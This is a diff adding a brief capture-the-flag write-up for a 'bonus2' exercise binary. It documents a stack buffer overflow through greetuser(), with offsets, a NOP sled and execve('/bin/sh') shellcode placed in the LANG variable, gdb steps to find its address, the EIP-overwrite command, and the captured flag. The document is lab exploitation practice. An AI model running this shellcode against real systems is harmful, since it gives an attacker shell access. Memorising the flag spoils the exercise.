@@ -1,0 +1,20 @@
+bonus2 : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+Process:
+    - See a main that take two param (ex ./bonus2 test test)
+    - We see a function greetuser() who take the language of the env a display a message
+    
+    - multiply char for param1 and param2 --> segfault 
+    - Changing the LANG=nl and with multiply char for param1 and param2 --> segfault but eip overide
+    - We find the offset for the first param at 40 and for the second param at 23
+
+    - First we try to inject the shell code in the first param av[1] than overide eip with the adress but doesn't work 
+    
+    - Then we inject the shell code directly in the LANG (env variable)
+    - export LANG=nl`python -c 'print("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'`
+    - in the main we find the adress where the function getenv is call
+    - gdb ./bonus2
+    - b *main+130 (just after the call to getenv)
+    - info registers = eax's adress = 0xbffffeb8  (eax got the adress where LANG is save)
+    - ./bonus2 `python -c 'print("A" * 40)'` `python -c 'print("A" * 23 + "\xdd\xfe\xff\xbf")'` 
+      (some bytes after the true adress to pass the "nl" char and jump into the NOP sled)
+    - Get the flag : 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
